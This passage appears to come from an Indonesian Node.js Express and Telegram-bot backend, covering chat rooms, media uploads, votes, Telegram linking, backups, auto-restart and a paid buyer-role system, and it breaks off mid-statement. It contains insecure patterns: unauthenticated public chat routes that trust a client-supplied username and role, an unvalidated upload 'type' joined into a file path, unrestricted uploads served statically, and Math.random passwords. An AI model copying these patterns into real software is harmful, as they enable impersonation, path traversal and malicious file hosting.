    }
    if (!room.admins.includes(keyInfo.username)) {
      return res.json({ valid: false, error: "Hanya admin yang bisa tambah member" });
    }
    if (room.members.includes(targetUsername)) {
      return res.json({ valid: false, error: "User sudah jadi member" });
    }

    room.members.push(targetUsername);
    rooms[idx] = room;
    saveChatRooms(rooms);

    // System message
    const messages = loadChatMessages();
    messages.push({
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      roomId: roomId,
      senderUsername: 'system',
      senderRole: 'system',
      type: 'system',
      text: `${targetUsername} ditambahkan ke group`,
      createdAt: new Date().toISOString(),
    });
    saveChatMessages(messages);

    return res.json({ valid: true, message: `${targetUsername} ditambahkan` });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 4. POST /chat/leave-group
// ═══════════════════════════════════════════════════════════
app.post("/chat/leave-group", express.json(), (req, res) => {
  try {
    const { key, roomId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === roomId);
    if (idx === -1) return res.json({ valid: false, error: "Group tidak ditemukan" });

    const room = rooms[idx];
    room.members = room.members.filter(m => m !== keyInfo.username);
    room.admins = room.admins.filter(m => m !== keyInfo.username);
    rooms[idx] = room;
    saveChatRooms(rooms);

    return res.json({ valid: true, message: "Berhasil keluar group" });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 5. POST /chat/open-private
// ═══════════════════════════════════════════════════════════
app.post("/chat/open-private", express.json(), (req, res) => {
  try {
    const { key, targetUsername } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    if (keyInfo.username === targetUsername) {
      return res.json({ valid: false, error: "Tidak bisa chat dengan diri sendiri" });
    }

    const rooms = loadChatRooms();
    const sorted = [keyInfo.username, targetUsername].sort();
    const privateId = `private_${sorted[0]}_${sorted[1]}`;

    let room = rooms.find(r => r.id === privateId);
    if (!room) {
      room = {
        id: privateId,
        type: 'private',
        name: targetUsername,
        avatarUrl: null,
        createdBy: keyInfo.username,
        members: sorted,
        admins: [],
        createdAt: new Date().toISOString(),
      };
      rooms.push(room);
      saveChatRooms(rooms);
    }

    return res.json({ valid: true, room });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 6. GET /chat/messages
// ═══════════════════════════════════════════════════════════
app.get("/chat/messages", (req, res) => {
  try {
    const { key, roomId, limit = 100, before } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const allMessages = loadChatMessages();
    let roomMsgs = allMessages.filter(m => m.roomId === roomId);

    if (before) {
      const beforeIdx = roomMsgs.findIndex(m => m.id === before);
      if (beforeIdx > -1) roomMsgs = roomMsgs.slice(0, beforeIdx);
    }

    const safeLimit = Math.min(parseInt(limit) || 100, 200);
    const sliced = roomMsgs.slice(-safeLimit);

    return res.json({ valid: true, messages: sliced });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 7. POST /chat/send-text
// ═══════════════════════════════════════════════════════════
app.post("/chat/send-text", express.json(), (req, res) => {
  try {
    const { key, roomId, text, replyTo } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    if (!text || text.trim().length === 0) {
      return res.json({ valid: false, error: "Pesan tidak boleh kosong" });
    }
    if (text.length > 2000) {
      return res.json({ valid: false, error: "Pesan terlalu panjang (max 2000 karakter)" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User not found" });

    // Cek apakah user member room
    const rooms = loadChatRooms();
    const room = rooms.find(r => r.id === roomId);
    if (!room) return res.json({ valid: false, error: "Room tidak ditemukan" });
    if (room.type !== 'global' && !room.members.includes(user.username)) {
      return res.json({ valid: false, error: "Kamu bukan member room ini" });
    }

    const messages = loadChatMessages();
    const msg = {
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      roomId: roomId,
      senderUsername: user.username,
      senderRole: user.role || 'member',
      senderAvatarUrl: user.profileImageUrl || null,
      type: 'text',
      text: text.trim(),
      replyTo: replyTo || null,
      createdAt: new Date().toISOString(),
      isDeleted: false,
    };
    messages.push(msg);
    saveChatMessages(messages);

    // Trim old messages jika lebih dari 5000
    if (messages.length > 5000) {
      saveChatMessages(messages.slice(-5000));
    }

    return res.json({ valid: true, message: msg });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 8. POST /chat/send-media
// ═══════════════════════════════════════════════════════════
const chatMediaStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const type = req.body.type || 'file';
    const dir = path.join(CHAT_MEDIA_DIR, type);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2, 8)}${ext}`);
  },
});
const uploadChatMedia = multer({
  storage: chatMediaStorage,
  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB
});

app.post("/chat/send-media", uploadChatMedia.single('file'), (req, res) => {
  try {
    const { key, roomId, type, text, replyTo } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    if (!req.file) return res.json({ valid: false, error: "File tidak ada" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User not found" });

    const mediaUrl = `${req.protocol}://${req.get('host')}/uploads/chat_media/${type}/${req.file.filename}`;

    const messages = loadChatMessages();
    const msg = {
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      roomId: roomId,
      senderUsername: user.username,
      senderRole: user.role || 'member',
      senderAvatarUrl: user.profileImageUrl || null,
      type: type || 'file',
      text: text || null,
      mediaUrl: mediaUrl,
      fileName: req.file.originalname,
      fileSize: req.file.size,
      mimeType: req.file.mimetype,
      replyTo: replyTo ? JSON.parse(replyTo) : null,
      createdAt: new Date().toISOString(),
      isDeleted: false,
    };
    messages.push(msg);
    saveChatMessages(messages);

    return res.json({ valid: true, message: "Media terkirim", mediaUrl: mediaUrl });
  } catch (err) {
    logError("[CHAT] send media error:", err.message);
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// Serve chat media
app.use('/uploads/chat_media', express.static(CHAT_MEDIA_DIR));

// ═══════════════════════════════════════════════════════════
// 9. POST /chat/create-vote
// ═══════════════════════════════════════════════════════════
app.post("/chat/create-vote", express.json(), (req, res) => {
  try {
    const { key, roomId, question, options, allowMultiple, durationMinutes } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    if (!question || !Array.isArray(options) || options.length < 2) {
      return res.json({ valid: false, error: "Minimal 2 opsi + pertanyaan" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User not found" });

    const vote = {
      question: question.trim(),
      options: options.map((text, i) => ({
        id: `opt_${i}_${Date.now()}`,
        text: text.trim(),
      })),
      userVotes: {},
      allowMultiple: allowMultiple === true,
      expiresAt: durationMinutes
        ? new Date(Date.now() + durationMinutes * 60 * 1000).toISOString()
        : null,
    };

    const messages = loadChatMessages();
    const msg = {
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      roomId: roomId,
      senderUsername: user.username,
      senderRole: user.role || 'member',
      senderAvatarUrl: user.profileImageUrl || null,
      type: 'vote',
      vote: vote,
      createdAt: new Date().toISOString(),
      isDeleted: false,
    };
    messages.push(msg);
    saveChatMessages(messages);

    return res.json({ valid: true, message: "Vote dibuat" });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 10. POST /chat/vote
// ═══════════════════════════════════════════════════════════
app.post("/chat/vote", express.json(), (req, res) => {
  try {
    const { key, roomId, messageId, optionId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const messages = loadChatMessages();
    const idx = messages.findIndex(m => m.id === messageId);
    if (idx === -1) return res.json({ valid: false, error: "Pesan tidak ditemukan" });

    const msg = messages[idx];
    if (msg.type !== 'vote' || !msg.vote) {
      return res.json({ valid: false, error: "Pesan ini bukan vote" });
    }

    // Check expired
    if (msg.vote.expiresAt && new Date(msg.vote.expiresAt) < new Date()) {
      return res.json({ valid: false, error: "Vote sudah expired" });
    }

    // Toggle vote
    if (msg.vote.userVotes[keyInfo.username] === optionId) {
      delete msg.vote.userVotes[keyInfo.username];
    } else {
      msg.vote.userVotes[keyInfo.username] = optionId;
    }

    messages[idx] = msg;
    saveChatMessages(messages);

    return res.json({ valid: true, message: "Vote tersimpan" });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 11. POST /chat/delete-message
// ═══════════════════════════════════════════════════════════
app.post("/chat/delete-message", express.json(), (req, res) => {
  try {
    const { key, messageId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const messages = loadChatMessages();
    const idx = messages.findIndex(m => m.id === messageId);
    if (idx === -1) return res.json({ valid: false, error: "Pesan tidak ditemukan" });

    const msg = messages[idx];

    // Cek: hanya pengirim yang bisa hapus
    if (msg.senderUsername !== keyInfo.username) {
      const db = loadDatabase();
      const user = db.find(u => u.username === keyInfo.username);
      const isAdmin = user && ['owner', 'developer', 'admin'].includes((user.role || '').toLowerCase());
      if (!isAdmin) {
        return res.json({ valid: false, error: "Tidak bisa hapus pesan orang lain" });
      }
    }

    messages[idx].isDeleted = true;
    messages[idx].text = null;
    messages[idx].mediaUrl = null;
    saveChatMessages(messages);

    return res.json({ valid: true, message: "Pesan dihapus" });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 12. GET /chat/users
// ═══════════════════════════════════════════════════════════
app.get("/chat/users", (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const db = loadDatabase();
    const users = db
      .filter(u => u.username !== keyInfo.username)
      .map(u => ({
        username: u.username,
        role: u.role || 'member',
        profileImageUrl: u.profileImageUrl || null,
      }));

    return res.json({ valid: true, users });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════════════
// [PUBLIK CHAT HTTP] — dipakai publik_chat.dart (TANPA session key)   ← PASTE DI SINI
// ═══════════════════════════════════════════════════════════════════

const chatUploadDir = path.join(__dirname, 'uploads', 'chat');
['images', 'videos', 'audio', 'files'].forEach(sub => {
  const d = path.join(chatUploadDir, sub);
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

const chatUploadStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const p = req.path;
    const sub = p.includes('video') ? 'videos'
              : p.includes('audio') ? 'audio'
              : p.includes('file') ? 'files'
              : 'images';
    cb(null, path.join(chatUploadDir, sub));
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2, 8)}${path.extname(file.originalname)}`);
  },
});
const uploadChatAny = multer({ storage: chatUploadStorage, limits: { fileSize: 60 * 1024 * 1024 } });

app.use('/uploads/chat', express.static(chatUploadDir));

app.get('/api/chat/messages', (req, res) => {
  try {
    const pub = loadPublikChat();
    const limit = Math.min(parseInt(req.query.limit) || 200, 500);
    const sliced = pub.global.slice(-limit);
    return res.json({ messages: enrichChatMessages(sliced) });
  } catch (err) {
    return res.status(500).json({ messages: [], error: err.message });
  }
});

app.post('/api/chat/send', express.json(), (req, res) => {
  try {
    const { userId, username, role, message, replyTo, timestamp } = req.body || {};
    if (!message || !username) {
      return res.status(400).json({ success: false, message: 'username & message wajib' });
    }
    if (String(message).length > 2000) {
      return res.status(400).json({ success: false, message: 'Pesan max 2000 karakter' });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === username);

    const pub = loadPublikChat();
    const msg = enrichChatMessage({
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      userId: userId || username,
      username,
      displayName: user?.displayName || username,
      role: role || user?.role || 'member',
      message: String(message),
      replyTo: replyTo || null,
      timestamp: timestamp || new Date().toISOString(),
      avatarUrl: 'assets/images/logo.jpg',
      profileImageUrl: user?.profileImageUrl || null,
      isDeleted: false,
    });

    pub.global.push(msg);
    if (pub.global.length > 1000) pub.global = pub.global.slice(-1000);
    savePublikChat(pub);

    logSuccess(`[GLOBAL] ${username}: ${String(message).substring(0, 40)}`);
    return res.json({ success: true, message: msg });
  } catch (err) {
    return res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/chat/users', (req, res) => {
  try {
    const db = loadDatabase();
    const users = db.map(u => ({
      username: u.username,
      displayName: u.displayName || u.username,
      role: u.role || 'member',
      profileImageUrl: u.profileImageUrl || null,
    }));
    return res.json({ success: true, users });
  } catch (err) {
    return res.status(500).json({ success: false, users: [] });
  }
});

function handleGlobalUpload(req, res, mediaType) {
  try {
    if (!req.files || req.files.length === 0) {
      return res.status(400).json({ success: false, message: 'Tidak ada file' });
    }
    const file = req.files[0];
    const sub = mediaType === 'image' ? 'images'
              : mediaType === 'video' ? 'videos'
              : mediaType === 'audio' ? 'audio' : 'files';
    const mediaUrl = `${req.protocol}://${req.get('host')}/uploads/chat/${sub}/${file.filename}`;
    const { userId, username, role, replyTo } = req.body || {};

    const db = loadDatabase();
    const user = db.find(u => u.username === username);

    const pub = loadPublikChat();
    const msg = enrichChatMessage({
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      userId: userId || username || 'unknown',
      username: username || 'unknown',
      displayName: user?.displayName || username || 'unknown',
      role: role || user?.role || 'member',
      message: null,
      imageUrl: mediaType === 'image' ? mediaUrl : null,
      videoUrl: mediaType === 'video' ? mediaUrl : null,
      voiceUrl: mediaType === 'audio' ? mediaUrl : null,
      fileUrl:  mediaType === 'file'  ? mediaUrl : null,
      replyTo: replyTo || null,
      timestamp: new Date().toISOString(),
      avatarUrl: 'assets/images/logo.jpg',
      profileImageUrl: user?.profileImageUrl || null,
      isDeleted: false,
    });

    pub.global.push(msg);
    if (pub.global.length > 1000) pub.global = pub.global.slice(-1000);
    savePublikChat(pub);

    logSuccess(`[GLOBAL-UPLOAD] ${username} → ${mediaType}`);
    return res.json({ success: true, data: { value: mediaUrl }, url: mediaUrl });
  } catch (err) {
    logError('[GLOBAL-UPLOAD] err:', err.message);
    return res.status(500).json({ success: false, message: err.message });
  }
}

function handlePrivateUpload(req, res, mediaType) {
  try {
    if (!req.files || req.files.length === 0) {
      return res.status(400).json({ success: false, message: 'Tidak ada file' });
    }
    const file = req.files[0];
    const sub = mediaType === 'image' ? 'images'
              : mediaType === 'video' ? 'videos'
              : mediaType === 'audio' ? 'audio' : 'files';
    const mediaUrl = `${req.protocol}://${req.get('host')}/uploads/chat/${sub}/${file.filename}`;
    logSuccess(`[PRIV-UPLOAD] ${req.body?.username || '?'} → ${mediaType}`);
    return res.json({ success: true, data: { value: mediaUrl }, url: mediaUrl });
  } catch (err) {
    logError('[PRIV-UPLOAD] err:', err.message);
    return res.status(500).json({ success: false, message: err.message });
  }
}

app.post('/api/chat/upload-image', uploadChatAny.any(), (req, res) => handleGlobalUpload(req, res, 'image'));
app.post('/api/chat/upload-video', uploadChatAny.any(), (req, res) => handleGlobalUpload(req, res, 'video'));
app.post('/api/chat/upload-file',  uploadChatAny.any(), (req, res) => handleGlobalUpload(req, res, 'file'));
app.post('/api/chat/upload-audio', uploadChatAny.any(), (req, res) => handleGlobalUpload(req, res, 'audio'));

app.post('/api/chat/private-upload-image', uploadChatAny.any(), (req, res) => handlePrivateUpload(req, res, 'image'));
app.post('/api/chat/private-upload-video', uploadChatAny.any(), (req, res) => handlePrivateUpload(req, res, 'video'));
app.post('/api/chat/private-upload-file',  uploadChatAny.any(), (req, res) => handlePrivateUpload(req, res, 'file'));
app.post('/api/chat/private-upload-audio', uploadChatAny.any(), (req, res) => handlePrivateUpload(req, res, 'audio'));

// ═══════════════════════════════════════════════════════════════════════════════
// [END CHAT ENDPOINTS]
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════
// [+] API: LINK TELEGRAM KE ACCOUNT
// ═══════════════════════════════════════════════════════════
app.post("/api/link-telegram", express.json(), (req, res) => {
  try {
    const { key, telegramId, telegramUsername } = req.body;

    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: "Session invalid" });

    if (!telegramId) return res.status(400).json({ valid: false, message: "telegramId wajib" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, message: "User not found" });

    const existing = getUsernameByTelegramId(telegramId);
    if (existing && existing !== keyInfo.username) {
      return res.status(409).json({
        valid: false,
        message: `Telegram ID ini sudah di-link ke account lain (${existing})`,
      });
    }

    linkTelegramToAccount(telegramId, keyInfo.username);

    const idx = db.findIndex(u => u.username === keyInfo.username);
    db[idx].telegramId = String(telegramId);
    db[idx].telegramUsername = telegramUsername || null;
    db[idx].telegramLinkedAt = new Date().toISOString();
    saveDatabase(db);

    logSuccess(`[LINK] ${keyInfo.username} → TG ${telegramId}`);

    res.json({
      valid: true,
      message: "Telegram berhasil di-link",
      username: keyInfo.username,
      telegramId: String(telegramId),
    });
  } catch (err) {
    logError("[LINK] error:", err.message);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// [+] API: CEK STATUS LINK TELEGRAM
// ═══════════════════════════════════════════════════════════
app.get("/api/link-status", (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false });

    res.json({
      valid: true,
      linked: !!user.telegramId,
      telegramId: user.telegramId || null,
      telegramUsername: user.telegramUsername || null,
      linkedAt: user.telegramLinkedAt || null,
    });
  } catch (err) {
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// [+] API: SYNC ROLE DARI APP (manual trigger)
// ═══════════════════════════════════════════════════════════
app.get("/api/sync-role", async (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false });

    if (!user.telegramId) {
      return res.json({
        valid: false,
        reason: 'not_linked',
        message: 'Akun belum di-link ke Telegram. Link dulu di menu Profile.',
      });
    }

    const result = await syncUserRoleFromGroups(user.telegramId);

    res.json({ valid: true, ...result });
  } catch (err) {
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// [+] API: LIST SEMUA GRUP SYNC (buat debug app)
// ═══════════════════════════════════════════════════════════
app.get("/api/sync-groups", (req, res) => {
  res.json({
    valid: true,
    groups: Object.entries(ROLE_SYNC_GROUPS).map(([id, role]) => ({ id, role })),
  });
});

// ==========================================================
// [+] ENDPOINT: /api/backup - Trigger backup via API
// ==========================================================
app.get("/api/backup", async (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false, message: "User not found" });

  // 🔒 CEK AKSES — HANYA USERNAME DIIZINKAN
  if (!isAllowedBackupUsername(user.username)) {
    return res.status(403).json({ valid: false, message: "Akses ditolak. Hanya owner server yang bisa backup." });
  }

  const result = await performBackup(`API Backup oleh ${user.username}`);

  if (result) {
    return res.json({ valid: true, message: "Backup berhasil", data: result });
  }
  return res.status(500).json({ valid: false, message: "Backup gagal" });
});

// ==========================================================
// [+] ENDPOINT: /api/listbackup - List backup
// ==========================================================
app.get("/api/listbackup", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  // 🔒 CEK AKSES
  if (!isAllowedBackupUsername(keyInfo.username)) {
    return res.status(403).json({ valid: false, message: "Akses ditolak" });
  }

  const state = readBackupState();
  initBackupDir();

  const folders = fs.readdirSync(BACKUP_DIR)
    .filter(f => f.startsWith('backup_') && fs.statSync(path.join(BACKUP_DIR, f)).isDirectory())
    .sort()
    .reverse()
    .map(folder => {
      const metaPath = path.join(BACKUP_DIR, folder, '_metadata.json');
      let meta = null;
      try {
        if (fs.existsSync(metaPath)) meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
      } catch {}
      return { folderName: folder, metadata: meta };
    });

  res.json({
    valid: true,
    total: folders.length,
    maxBackups: MAX_BACKUPS,
    intervalHours: BACKUP_INTERVAL_MS / 3600000,
    lastBackup: state.lastBackup,
    backupCount: state.backupCount,
    history: state.history || [],
    backups: folders,
  });
});

// ==========================================================
// [+] AUTO RESTART SYSTEM
// ==========================================================
async function performRestart(reason = "Auto Restart Terjadwal") {
  if (isRestarting) {
    logWarning("[RESTART] Sedang proses restart, skip.");
    return;
  }
  isRestarting = true;

  // 🔥 TAMBAHAN INI — Backup sebelum restart
  try {
    logWarning("[RESTART] Backup otomatis sebelum restart...");
    await performBackup(`Auto Backup sebelum restart`);
  } catch (e) {
    logError("[RESTART] Backup gagal:", e.message);
  }

  const state = readRestartState();      // ← lanjut ke sini
  const uptime = formatUptime(Date.now() - SERVER_START_TIME);
  // ...
  logWarning(`[RESTART] Memulai restart. Alasan: ${reason}`);

  // 1. Kirim notif RESTARTING
  await notifyGroup(
  `*Alasan:* ${reason}\n` +
  `*Uptime:* ${uptime}\n` +
  `*Restart Count:* ${state.restartCount + 1}\n` +
  `*Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
  `Mohon tunggu ~10-30 detik...`,
  'Markdown',
  {
    title: '🔄 SERVER RESTARTING',
    footer: '© X-FORCE Project'
  }
);

  // 2. Update state
  state.lastRestart = Date.now();
  state.restartCount = (state.restartCount || 0) + 1;
  state.firstBoot = false;
  state.lastReason = reason;
  saveRestartState(state);

  // 3. Delay biar notif kekirim
  await new Promise(r => setTimeout(r, 2000));

  // 4. Graceful shutdown
  logWarning("[RESTART] Menutup koneksi & keluar...");
  
  try {
    // Tutup semua WA connections
    for (const name in activeConnections) {
      try { activeConnections[name].ws?.close(); } catch {}
    }
    // Tutup VPS connections
    disconnectAllVPS();
    // Tutup server
    server.close();
  } catch (e) {
    logError("[RESTART] Cleanup error:", e.message);
  }

  setTimeout(() => {
    process.exit(0); // PM2/systemd akan restart otomatis
  }, 1500);
}

// Start auto restart timer
function startAutoRestartTimer() {
  if (restartTimer) clearInterval(restartTimer);
  
  const state = readRestartState();
  const elapsed = Date.now() - (state.lastRestart || SERVER_START_TIME);
  const remaining = RESTART_INTERVAL_MS - elapsed;

  if (remaining <= 0) {
    logWarning("[RESTART] Interval sudah lewat, restart sekarang...");
    setTimeout(() => performRestart("Interval auto-restart terlewat"), 10000);
    return;
  }

  logSuccess(`[RESTART] Auto-restart dalam ${formatUptime(remaining)} lagi.`);

  restartTimer = setTimeout(() => {
    performRestart("Auto Restart Terjadwal (6 Jam)");
  }, remaining);
}

// ==========================================================
// [+] GRACEFUL SHUTDOWN HANDLER
// ==========================================================
process.on('SIGINT', async () => {
  logWarning("[SHUTDOWN] SIGINT diterima, cleanup...");
  await notifyGroup(" *Server dihentikan manual (SIGINT)*");
  await new Promise(r => setTimeout(r, 1500));
  process.exit(0);
});

process.on('SIGTERM', async () => {
  logWarning("[SHUTDOWN] SIGTERM diterima, cleanup...");
  if (!isRestarting) {
    await notifyGroup(" *Server dihentikan oleh sistem (SIGTERM)*");
    await new Promise(r => setTimeout(r, 1500));
  }
  process.exit(0);
});

// Watchdog: cek apakah process masih hidup
process.on('uncaughtException', (err) => {
  logError('[CRASH] Uncaught Exception:', err);
  // Biarkan exit agar PM2 restart
});

process.on('unhandledRejection', (reason) => {
  logError('[CRASH] Unhandled Rejection:', reason);
});

// ═══════════════════════════════════════════════════════════════════════════════
// [+] SETORAN BUYER SYSTEM — FULL VERSION (FIXED)
// ═══════════════════════════════════════════════════════════════════════════════

// ─── KONFIGURASI (GANTI SESUAI KEBUTUHAN) ────────────────────────────────────
const BUYER_QRIS_IMAGE = "https://files.catbox.moe/vkia2j.jpg";     // ⚠️ GANTI URL QRIS ASLI
const BUYER_GROUP_LINK = "https://t.me/+7cFbWsWP2wlkNWY1";          // ⚠️ GANTI LINK GROUP ASLI
const SETORAN_BUYER_PRICE = 2000;
const BUYER_DEFAULT_DURATION_DAYS = 30;

// ─── FILE PATHS ──────────────────────────────────────────────────────────────
const BUYER_SETORAN_FILE = path.join(__dirname, "setoran_buyer.json");
const APPROVED_BUYERS_FILE = path.join(__dirname, "approved_buyers.json");

if (!fs.existsSync(BUYER_SETORAN_FILE)) fs.writeFileSync(BUYER_SETORAN_FILE, JSON.stringify([]));
if (!fs.existsSync(APPROVED_BUYERS_FILE)) fs.writeFileSync(APPROVED_BUYERS_FILE, JSON.stringify([]));

// ─── STATE ───────────────────────────────────────────────────────────────────
const pendingStoranBuyer = {};
const sbrLocks = new Set();

// ─── ROLE PERMISSION MATRIX ──────────────────────────────────────────────────
const SELLER_ROLE_PERMISSIONS = {
  member:    [],
  vip:       ["member", "reseller"],
  reseller:  ["member"],
  partner:   ["member", "reseller", "vip"],
  admin:     ["member", "reseller", "vip", "partner"],
  owner:     ["member", "vip", "reseller", "partner", "owner"],
  developer: ["member", "vip", "reseller", "partner", "owner", "developer"],
  god:       ["member", "vip", "reseller", "partner", "owner", "developer"],
};

const ROLE_LABELS = {
  member:    "👤 Member",
  vip:       "⭐ VIP",
  reseller:  "💼 Reseller",
  partner:   "🤝 Partner",
  owner:     "👑 Owner",
  developer: "🥷 Developer",
};

// ─── HELPERS ─────────────────────────────────────────────────────────────────
function loadBuyerSetoran() {
  try { return JSON.parse(fs.readFileSync(BUYER_SETORAN_FILE, "utf8") || "[]"); }
  catch { return []; }
}

function saveBuyerSetoran(data) {
  try { fs.writeFileSync(BUYER_SETORAN_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { logError("[STORAN-BUYER] Gagal save:", e.message); }
}

function loadApprovedBuyers() {
  try { return JSON.parse(fs.readFileSync(APPROVED_BUYERS_FILE, "utf8") || "[]"); }
  catch { return []; }
}

function saveApprovedBuyers(data) {
  try { fs.writeFileSync(APPROVED_BUYERS_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { logError("[STORAN-BUYER] Gagal save approved:", e.message); }
}

function genBuyerSetoranId() {
  return `SB_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`;
}

function getAllowedBuyerRoles(sellerTelegramRole) {
  if (!sellerTelegramRole) return [];
  return SELLER_ROLE_PERMISSIONS[sellerTelegramRole] || [];
}

function saveApprovedBuyer(username, groupLink, buyerData) {
  const list = loadApprovedBuyers();
  list.push({
    username: username.toLowerCase(),
    groupLink,
    buyerData,
    approvedAt: new Date().toISOString(),
    used: false,
  });
  saveApprovedBuyers(list);
}

function generatePassword(length = 10) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. COMMAND /storan req @username
// ═══════════════════════════════════════════════════════════════════════════════
bot.onText(/^\/storan\s+req\s+@?(\w+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const sellerId = msg.from.id;
  const sellerUsername = msg.from.username || `user_${sellerId}`;
  const buyerUsername = match[1].trim().toLowerCase();
  const bl = getBlacklist();

  if (bl.includes(String(sellerId))) {
    return bot.sendMessage(chatId, "🚫 Kamu sedang diblacklist.");
  }

  if (chatId !== ID_GROUP) {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa di grup utama.");
  }

  const sellerRole = getTelegramRole(sellerId);
  if (!sellerRole) {
    return bot.sendMessage(chatId, "❌ Kamu tidak terdaftar sebagai user bot.");
  }

  const allowedRoles = getAllowedBuyerRoles(sellerRole);
  if (allowedRoles.length === 0) {
    return bot.sendMessage(chatId,
      `❌ *Role ${sellerRole.toUpperCase()} tidak bisa membuat setoran buyer.*\n\n` +
      `Hubungi @xyzyanzzi untuk upgrade role.`,
      { parse_mode: "Markdown" }
    );
  }

  const db = loadDatabase();
  if (db.find(u => u.username.toLowerCase() === buyerUsername)) {
    return bot.sendMessage(chatId,
      `❌ Username *${buyerUsername}* sudah terdaftar di database.`,
      { parse_mode: "Markdown" }
    );
  }

  const approved = loadApprovedBuyers();
  if (approved.find(b => b.username.toLowerCase() === buyerUsername && !b.used)) {
    return bot.sendMessage(chatId,
      `⚠️ Buyer *${buyerUsername}* sedang dalam proses setoran.\n` +
      `Tunggu hingga buyer join grup atau hubungi admin.`,
      { parse_mode: "Markdown" }
    );
  }

  if (pendingStoranBuyer[sellerId]) {
    return bot.sendMessage(chatId,
